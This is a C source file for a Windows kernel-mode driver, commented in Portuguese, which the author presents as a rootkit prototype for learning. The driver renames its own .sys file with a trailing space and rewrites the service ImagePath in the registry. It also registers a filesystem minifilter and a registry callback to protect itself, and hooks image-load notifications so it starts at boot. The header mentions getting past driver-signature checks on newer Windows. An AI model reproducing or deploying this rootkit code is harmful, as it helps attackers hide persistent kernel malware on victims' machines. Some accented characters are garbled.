

/*

	Prot�tipo de Rootkit, por favor, use-o para fins de aprendizado

	Funciona somente em: Windows 7, 8 & 8.1. Preciso de uma assintura
	de driver para burlar o Windows 10 & 11, pois ele n�o consegue verificar
	a assinatura por causa do arquivo 'Rootkit.sys ' bugado

	Por favor, n�o instale o driver em Windows 10 ou 11, ele ficar� bugado depois de um tempo,
	e particularmente, achei dif�cil de resolver, pois ele n�o entra diretamente
	no modo de recupera��o, e sim, fica numa tela dizendo que n�o foi poss�vel
	verificar a assinatura do driver

	Qualquer d�vida, me contate no Discord: eldimas, ou Linkedin: https://www.linkedin.com/in/eldimas/

*/

#include "cabecalho.h"

BOOLEAN AcessouArquivo = FALSE;

/// <summary>
/// Opera��o que vai renomear o driver para colocar um espa�o no final
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS para indicar se a opera��o foi um sucesso ou n�o</returns>
NTSTATUS RenomearDriver()
{

	NTSTATUS Status = STATUS_SUCCESS;

	__try {

		OBJECT_ATTRIBUTES Atributos;
		IO_STATUS_BLOCK Io;

		InitializeObjectAttributes(&Atributos, &LOCAL_DRIVER, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

		KdPrint(("Tentando abrir o arquivo: %wZ\n", LOCAL_DRIVER));

		Status = ZwOpenFile(

			&Alca, GENERIC_ALL, &Atributos, &Io, 0, FILE_NON_DIRECTORY_FILE

		);

		if (NT_SUCCESS(Status))
		{
			KdPrint(("Abriu com sucesso: %wZ\n", LOCAL_DRIVER));

			PFILE_RENAME_INFORMATION Renomear = NULL;

			// Tente alocar espa�o para opera��o de renomea��o
			Renomear = ExAllocatePoolWithTag(PagedPool, sizeof(PFILE_RENAME_INFORMATION) + LOCAL_NOVO.MaximumLength, 'kkpp');

			if (!Renomear)
			{
				KdPrint(("Falha ao alocar memoria para o 'Alocar' :(\n"));
				return STATUS_UNSUCCESSFUL;
			}

			// Zere
			RtlZeroMemory(Renomear, sizeof(PFILE_RENAME_INFORMATION) + LOCAL_NOVO.MaximumLength);

			Renomear->FileNameLength = LOCAL_NOVO.Length;

			// Copie o nome do arquivo
			wcscpy(Renomear->FileName, LOCAL_NOVO.Buffer);
			Renomear->ReplaceIfExists = TRUE;
			Renomear->RootDirectory = NULL;

			// Renomeie
			Status = ZwSetInformationFile(Alca, &Io, Renomear, sizeof(FILE_RENAME_INFORMATION) + LOCAL_NOVO.MaximumLength, FileRenameInformation);

			if (NT_SUCCESS(Status))
			{
				KdPrint(("Conseguiu renomear para %wZ!\n", LOCAL_NOVO));
			}
			else {

				KdPrint(("Falha ao renomear! %0x\n", Status));
			}

		}
		
		else if (Status == STATUS_OBJECT_NAME_NOT_FOUND)
		{
			KdPrint(("J� foi renomeado para %wZ provalmente, %0x\n", LOCAL_NOVO, Status));

			Status = STATUS_SUCCESS;
		}

		else
		{

			KdPrint(("Falha ao abrir o arquivo: %wZ %0x\n", LOCAL_DRIVER, Status));

		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{

		KdPrint(("Falha no catch ao abrir o arquivo: %wZ %0x\n", LOCAL_DRIVER, Status));

	}


	return Status;

}


/*

	POR ALGUM MOTIVO, O RenomearRegistro() IMPEDE O CARREGAMENTO DO DRIVER QUANDO � EXECUTADO NO BOOT.
	ENT�O, POR ISSO, EU FAREI ESSA PARTE NO USER-MODE NA HORA DE INSTALAR

*/

/// <summary>
/// Renomeia o ImagePath, para que carrega o arquivo 'RootKit.sys ' em vez de 'RootKit.sys'
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS RenomearRegistro()
{
	NTSTATUS Status = STATUS_SUCCESS;

	__try {

		// Inicie os atributos
		OBJECT_ATTRIBUTES Atributos;
		InitializeObjectAttributes(&Atributos, &LOCAL_REGISTRO, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

		HANDLE AlcaKey;

		// Valor da chave
		PKEY_VALUE_PARTIAL_INFORMATION pValor;
		ULONG tamanhoBuffer = 0;
		ULONG tamanhoValor;


		KdPrint(("Tentando abrir chave no registro: %wZ\n", LOCAL_REGISTRO));

		Status = ZwOpenKey(
			&AlcaKey, KEY_ALL_ACCESS, &Atributos
		);

		if (NT_SUCCESS(Status))
		{

			KdPrint(("Conseguiu abrir a chave! Tentando modificar valor agora\n"));

			// Inicie
			UNICODE_STRING imagePath;
			RtlInitUnicodeString(&imagePath, L"ImagePath");

			// Determine o tamanho do buffer necess�rio para armazenar o valor
			Status = ZwQueryValueKey(AlcaKey, &imagePath, KeyValuePartialInformation, NULL, 0, &tamanhoBuffer);

			// Se n�o recebeu um erro de buffer
			if (Status != STATUS_BUFFER_TOO_SMALL)
			{
				// Tratamento de erro ao determinar o tamanho do buffer necess�rio
				ZwClose(AlcaKey);
				return Status;
			}

			// Aloque mem�ria para armazenar o valor, agora que obtemos o tamanho correto no ZwQueryValueKey
			pValor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, tamanhoBuffer, 'REGV');

			// Se n�o alocou
			if (pValor == NULL)
			{
				// Tratamento de erro ao alocar mem�ria
				ZwClose(AlcaKey);
				return STATUS_INSUFFICIENT_RESOURCES;
			}

			// Recupere o valor da chave do registro, agora com o tamanho correto
			Status = ZwQueryValueKey(AlcaKey, &imagePath, KeyValuePartialInformation, pValor, tamanhoBuffer, &tamanhoValor);

			if (!NT_SUCCESS(Status))
			{
				// Tratamento de erro ao recuperar o valor da chave
				ExFreePoolWithTag(pValor, 'REGV');

				// Feche
				ZwClose(AlcaKey);
				return Status;
			}
			
			// Se j� tiver alterado, n�o h� pra que continuar (por algum motivo, o nome fica com uma linha quebrada, e com um \*, ent�o, acho que o * j� serve)
			if (wcsstr((wchar_t*)pValor->Data, L"*"))
			{
				KdPrint(("O valor j� foi modificado corretamente"));

				// Tratamento de erro ao recuperar o valor da chave
				ExFreePoolWithTag(pValor, 'REGV');

				// Feche
				ZwClose(AlcaKey);
				return STATUS_SUCCESS;
			}

			ExFreePoolWithTag(pValor, 'REGV');

			// Altere o valor para o novo
			Status = ZwSetValueKey(AlcaKey, &imagePath, 0, KeyValuePartialInformation, NOVO_VALOR.Buffer, NOVO_VALOR.Length);
			
			if (NT_SUCCESS(Status))
			{
				KdPrint(("Conseguiu abrir a chave e trocar o valor!\n"));

			}
			else {

				KdPrint(("Falha ao trocar o valor da chave %wZ %0x\n", LOCAL_REGISTRO, Status));

			}

			ZwClose(AlcaKey);
		}
		else {

			KdPrint(("Falha ao abrir o registro: %wZ %0x\n", LOCAL_REGISTRO, Status));

		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{

		KdPrint(("Falha no catch ao abrir o registro: %wZ %0x\n", LOCAL_REGISTRO, Status));

	}

	return Status;

}

/// <summary>
/// Registra o minifiltro para mais prote�ao
/// </summary>
/// 
/// <param name="ObjetoDriver">Iniciado no DriverEntry</param>
/// 
/// <returns>Retorna um NTSTATU</returns>
NTSTATUS RegistrarMinifiltro(IN PDRIVER_OBJECT ObjetoDriver)
{
	KdPrint(("Tentando registrar minifiltro...\n"));

	NTSTATUS Status = FltRegisterFilter(ObjetoDriver, &RegistroMinifiltro, &Filtro);

	if (NT_SUCCESS(Status))
	{
		KdPrint(("Minifiltro registrado com sucesso! Tentando inicia-l�\n"));
		Status = FltStartFiltering(Filtro);

		if (NT_SUCCESS(Status))
		{
			KdPrint(("Minifiltro iniciado com sucesso!\n"));
		}
		else {

			KdPrint(("Falha ao iniciar minifiltro %0x\n", Status));
		}
	}
	else {

		KdPrint(("Falha ao registrar minifiltro %0x\n", Status));

	}

}

/// <summary>
/// Registra a monitora��o de registros
/// </summary>
/// 
/// <param name="ObjetoDriver">Iniciado no DriverEntry</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS RegistrarMonitorDeRegistro(IN PDRIVER_OBJECT ObjetoDriver)
{
	KdPrint(("Registrando o monitor de registros...\n"));

	UNICODE_STRING Altitude = RTL_CONSTANT_STRING(L"354339");

	// Registre
	NTSTATUS Status = CmRegisterCallbackEx(
		OperacaoRegistro,
		&Altitude,
		ObjetoDriver,
		NULL,
		&RegistroRegedit,
		NULL
	);

	if (NT_SUCCESS(Status))
	{
		KdPrint(("Monitor de registros instalado!\n"));
	}
	else {

		KdPrint(("Falha ao registrar o monitor de registros %0x\n", Status));
	}

	return Status;
}



PDRIVER_OBJECT ObjetoDriverBackup = NULL;

VOID Carregar()
{
	// Ok, como estamos iniciando no BOOT, n�o vamos conseguir acessar o HarddiskVolume ou C:\
	// ent�o, a solu��o �: quando um novo processo do kernel iniciar, verificamos
	// se conseguimos fazer isso, e se n�o, vamos tentar novamente. Pelo menos
	// at� encontrar a pasta das configura��es
	if (AcessouArquivo == FALSE)
	{
		// Se conseguiu renomear o arquivo, ou acessar o caminho, ent�o, podemos continuar
		if (NT_SUCCESS(RenomearDriver()))
		{
			AcessouArquivo = TRUE;

			//RenomearRegistro();

			RegistrarMinifiltro(ObjetoDriverBackup);
			RegistrarMonitorDeRegistro(ObjetoDriverBackup);
		}
	}

}

VOID ImageLoadCallback(
	IN PUNICODE_STRING LocalCompleto,
	IN HANDLE Pid,
	IN PIMAGE_INFO ImageInfo
)
{
	Carregar();
}

NTSTATUS Descarregar(
	IN FLT_FILTER_UNLOAD_FLAGS Flags
)
{
	UNREFERENCED_PARAMETER(Flags);

	// Remova o monitoramento de imagens
	PsRemoveLoadImageNotifyRoutine(ImageLoadCallback);

	IoDeleteDevice(DispositivoGlobal);
	IoDeleteSymbolicLink(&SysNome);

	// Remova o minifiltro
	FltUnregisterFilter(Filtro);

	// Remova o monitor de registro
	CmUnRegisterCallback(RegistroRegedit);

	if (Alca != NULL)
		ZwClose(Alca);
	

	KdPrint(("Rootkit descarregou\n"));
	return STATUS_SUCCESS;
}


/// <summary>
/// Fun��o que carrega o driver
/// </summary>
/// 
/// <param name="ObjetoDriver">Object do driver</param>
/// <param name="LocalRegistro">Local no registro</param>
/// 
/// <returns>Retorna um NSTATUS</returns>
NTSTATUS DriverEntry(
	OUT PDRIVER_OBJECT ObjetoDriver,
	IN PUNICODE_STRING LocalRegistro
)
{
	UNREFERENCED_PARAMETER(LocalRegistro);

	KdPrint(("Carregando driver...\n"));

	NTSTATUS Status = STATUS_SUCCESS;

	Status = IoCreateDevice(
		ObjetoDriver,
		0,
		&DispositivoNome,
		FILE_DEVICE_UNKNOWN,
		0,
		TRUE,
		&DispositivoGlobal
	);

	if (NT_SUCCESS(Status))
	{
		Status = IoCreateSymbolicLink(&SysNome, &DispositivoNome);
	}

	ObjetoDriver->MajorFunction[IRP_MJ_CREATE] = Criado;
	ObjetoDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Mensagem;
	ObjetoDriver->MajorFunction[IRP_MJ_CLOSE] = Fechado;

	ObjetoDriverBackup = ObjetoDriver;

	Carregar();

	// Registre as opera��es, apenas para iniciar as configura��es corretamente
	PsSetLoadImageNotifyRoutine(ImageLoadCallback);

	KdPrint(("Rootkit carregado\n"));
	return STATUS_SUCCESS;

}
